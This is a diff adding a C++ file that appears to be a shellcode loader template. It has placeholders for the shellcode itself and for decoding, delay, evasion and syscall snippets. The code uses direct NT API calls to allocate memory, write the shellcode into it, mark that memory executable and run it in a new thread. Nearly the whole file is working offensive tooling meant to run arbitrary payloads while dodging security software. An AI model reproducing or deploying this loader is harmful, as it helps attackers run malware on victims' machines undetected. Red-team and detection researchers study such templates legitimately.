@@ -1,0 +1,69 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+    //unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
+    //memcpy(encoded, raw, length);
+    //SIZE_T bytesWritten;
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####
+    HANDLE hProc = GetCurrentProcess();
+    DWORD oldprotect = 0;
+    PVOID base_addr = NULL;
+    HANDLE hThread = NULL;
+    SIZE_T bytesWritten;
+    SIZE_T pnew = length;
+
+
+    // Allocate memory for shellcode
+    NTSTATUS status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);
+
+    // Create a new thread to execute the shellcode
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, base_addr, NULL, 0, 0, 0, 0, NULL);
+
+    // Wait for thread to complete
+    status = NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    // Clean up handles
+    NtClose(hThread);
+    NtClose(hProc);
+    
+    return 0;
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    esc_main(NULL);
+}
